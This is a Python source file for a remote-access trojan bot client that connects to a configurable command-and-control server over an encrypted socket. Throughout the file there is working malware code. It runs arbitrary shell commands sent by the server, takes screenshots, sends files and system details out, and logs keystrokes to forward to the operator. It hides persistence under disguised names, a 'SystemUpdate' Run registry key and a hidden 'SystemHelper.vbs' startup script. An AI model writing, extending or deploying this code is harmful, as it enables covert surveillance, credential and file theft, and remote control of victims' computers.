import socket
import json
import os
import sys
import base64
import struct
import subprocess
import threading
import time
import platform
import hashlib
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

try:
    import pyautogui
    SCREENSHOT_AVAILABLE = True
except ImportError:
    SCREENSHOT_AVAILABLE = False

CONFIG_FILE = "bot_config.json"
KEY_FILE = "c2_key.key"
DATA_DIR = "c2_data"

class BotClient:
    def __init__(self, server_host, server_port, password):
        self.server_host = server_host
        self.server_port = server_port
        self.password = password
        self.sock = None
        self.running = False
        self.cipher = None
        self.keylogger_data = []
        self.keylog_lock = threading.Lock()
        self.init_crypto()
        self.init_data_dir()

    def init_crypto(self):
        key_path = os.path.join(DATA_DIR, KEY_FILE)
        if os.path.exists(key_path):
            with open(key_path, "rb") as f:
                key = f.read()
        else:
            salt = os.urandom(16)
            kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=480000)
            key = base64.urlsafe_b64encode(kdf.derive(self.password.encode()))
            os.makedirs(DATA_DIR, exist_ok=True)
            with open(key_path, "wb") as f:
                f.write(key)
        self.cipher = Fernet(key)

    def init_data_dir(self):
        os.makedirs(DATA_DIR, exist_ok=True)

    def encrypt(self, data):
        return self.cipher.encrypt(data if isinstance(data, bytes) else data.encode())

    def decrypt(self, data):
        return self.cipher.decrypt(data)

    def send_packet(self, data_type, payload):
        try:
            packet = json.dumps({"type": data_type, "payload": payload})
            encrypted = self.encrypt(packet)
            header = struct.pack("!I", len(encrypted))
            self.sock.sendall(header + encrypted)
            return True
        except:
            return False

    def recv_packet(self):
        try:
            header = self.sock.recv(4)
            if not header or len(header) < 4:
                return None, None
            data_len = struct.unpack("!I", header)[0]
            encrypted = b""
            while len(encrypted) < data_len:
                chunk = self.sock.recv(data_len - len(encrypted))
                if not chunk:
                    return None, None
                encrypted += chunk
            decrypted = self.decrypt(encrypted)
            packet = json.loads(decrypted)
            return packet.get("type"), packet.get("payload")
        except:
            return None, None

    def get_system_info(self):
        info = {
            "hostname": platform.node(),
            "os": platform.system(),
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "processor": platform.processor(),
            "python_version": sys.version,
            "ip": self.get_public_ip(),
            "username": os.getenv("USERNAME", "?"),
            "computer_name": os.getenv("COMPUTERNAME", "?"),
            "user_domain": os.getenv("USERDOMAIN", "?"),
            "cwd": os.getcwd()
        }
        return info

    def get_public_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "0.0.0.0"

    def exec_command(self, cmd):
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=60
            )
            output = ""
            if result.stdout:
                output += result.stdout
            if result.stderr:
                output += f"\n[STDERR]\n{result.stderr}"
            if result.returncode != 0:
                output += f"\n[EXIT CODE: {result.returncode}]"
            return output.strip() or f"Command executed (exit code: {result.returncode})"
        except subprocess.TimeoutExpired:
            return "[TIMEOUT] Command timed out (60s)"
        except Exception as e:
            return f"[ERROR] {e}"

    def take_screenshot(self):
        if not SCREENSHOT_AVAILABLE:
            return None
        try:
            img = pyautogui.screenshot()
            img_bytes = img.tobytes()
            img_size = img.size
            img_mode = img.mode
            from io import BytesIO
            from PIL import Image
            buf = BytesIO()
            img.save(buf, format="PNG")
            buf.seek(0)
            return base64.b64encode(buf.read()).decode()
        except Exception as e:
            return None

    def download_file(self, path):
        try:
            if not os.path.exists(path):
                return None, f"File not found: {path}"
            with open(path, "rb") as f:
                data = f.read()
            return base64.b64encode(data).decode(), os.path.basename(path)
        except Exception as e:
            return None, str(e)

    def connect(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.settimeout(30)
                self.sock.connect((self.server_host, self.server_port))
                self.sock.settimeout(None)
                self.sock.send(self.password.encode())
                response = self.sock.recv(1024).decode().strip()
                if response != "AUTH_OK":
                    print(f"Auth failed: {response}")
                    self.sock.close()
                    time.sleep(10)
                    continue
                print(f"[+] Connected to C2 {self.server_host}:{self.server_port}")
                self.running = True
                self.send_packet("info", self.get_system_info())
                self.command_loop()
            except socket.timeout:
                print("[-] Connection timeout, retrying...")
            except ConnectionRefusedError:
                print("[-] Connection refused, retrying...")
            except Exception as e:
                print(f"[-] Connection error: {e}")
            finally:
                self.running = False
                try:
                    self.sock.close()
                except:
                    pass
            time.sleep(10)

    def command_loop(self):
        while self.running:
            try:
                data_type, payload = self.recv_packet()
                if data_type is None:
                    print("[-] Connection lost")
                    break

                if data_type == "ping":
                    self.send_packet("pong", {"alive": True})

                elif data_type == "exec":
                    cmd = payload.get("cmd", "")
                    result = self.exec_command(cmd)
                    self.send_packet("result", result)

                elif data_type == "screenshot":
                    img_b64 = self.take_screenshot()
                    if img_b64:
                        self.send_packet("screenshot", {"data": img_b64})
                    else:
                        self.send_packet("result", "[ERROR] Screenshot not available (install pyautogui)")

                elif data_type == "download":
                    path = payload.get("path", "")
                    data_b64, filename = self.download_file(path)
                    if data_b64:
                        self.send_packet("file", {"filename": filename, "data": data_b64})
                    else:
                        self.send_packet("result", f"[ERROR] Download failed: {filename}")

                elif data_type == "exit":
                    self.running = False
                    break

            except (socket.timeout, ConnectionError, OSError):
                print("[-] Connection lost in loop")
                break
            except Exception as e:
                print(f"[-] Error in command loop: {e}")
                break

    def start_keylogger(self):
        try:
            import keyboard
            def on_key(event):
                with self.keylog_lock:
                    self.keylogger_data.append(event.name)
                    if len(self.keylogger_data) >= 50:
                        data = "".join(self.keylogger_data)
                        self.keylogger_data.clear()
                        self.send_packet("keystrokes", {"data": data})
            keyboard.on_press(on_key)
            return True
        except ImportError:
            return False

    def stop(self):
        self.running = False
        try:
            self.sock.close()
        except:
            pass

    def persist_windows(self):
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            script_path = os.path.abspath(sys.argv[0])
            winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, f'"{sys.executable}" "{script_path}"')
            winreg.CloseKey(key)
            return True
        except:
            return False

    def persist_startup(self):
        try:
            startup_dir = os.path.join(
                os.getenv("APPDATA"),
                r"Microsoft\Windows\Start Menu\Programs\Startup"
            )
            script_path = os.path.abspath(sys.argv[0])
            vbs_path = os.path.join(startup_dir, "SystemHelper.vbs")
            vbs_content = f'''CreateObject("Wscript.Shell").Run ""\"{sys.executable}\"" \""{script_path}\""", 0, False'''
            with open(vbs_path, "w") as f:
                f.write(vbs_content)
            return True
        except:
            return False


def load_config():
    config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), CONFIG_FILE)
    if os.path.exists(config_path):
        with open(config_path) as f:
            return json.load(f)
    cfg = {
        "server_host": "127.0.0.1",
        "server_port": 4443,
        "password": "default_pass",
        "persist": False,
        "keylogger": False
    }
    with open(config_path, "w") as f:
        json.dump(cfg, f, indent=2)
    print(f"[*] Created config: {config_path}")
    print("[*] Edit server_host and password, then run again.")
    sys.exit(0)
    return cfg


def main():
    cfg = load_config()

    bot = BotClient(cfg["server_host"], cfg["server_port"], cfg["password"])

    if cfg.get("persist"):
        if bot.persist_windows() or bot.persist_startup():
            print("[+] Persistence installed")
        else:
            print("[-] Persistence failed")

    if cfg.get("keylogger"):
        if bot.start_keylogger():
            print("[+] Keylogger started")
        else:
            print("[-] Keylogger failed (keyboard module required)")

    bot.connect()


if __name__ == "__main__":
    main()
